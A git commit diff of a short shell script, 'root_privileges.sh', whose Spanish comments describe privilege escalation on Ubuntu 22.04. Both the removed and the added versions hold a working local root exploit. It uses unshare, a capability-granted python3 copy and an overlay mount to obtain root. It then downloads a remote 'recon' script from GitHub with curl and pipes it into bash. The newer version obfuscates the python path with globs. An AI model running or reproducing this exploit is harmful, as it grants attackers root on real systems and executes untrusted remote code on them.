0353d65f2a0917f9b4f223c1f140510382a4f3cf
DriveSec <156467160+DriveSec@users.noreply.github.com>
2024-03-17 03:43:01 +0100

    Update root_privileges.sh

--- root_privileges.sh
+++ root_privileges.sh
@@ -2,8 +2,5 @@
 
 # Escalada de privilegios en Ubuntu 22.04
 # Y ejecución de script con permisos root
-unshare -rm sh -c "mkdir l u w m && cp /usr/bin/python3 l/; \
-setcap 'cap_setuid+ep' l/python3; \
-mount -t overlay overlay -o lowerdir=l,upperdir=u,workdir=w m && \
-l/python3 -c 'import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"curl -s https://raw.githubusercontent.com/DriveSec/scripts/main/recon_ubuntu_system.sh | bash\")'; \
-rm -rf l u w m"
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
+setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"curl -s https://raw.githubusercontent.com/DriveSec/scripts/main/recon_ubuntu_system.sh | bash\")'";rm -rf l u w m
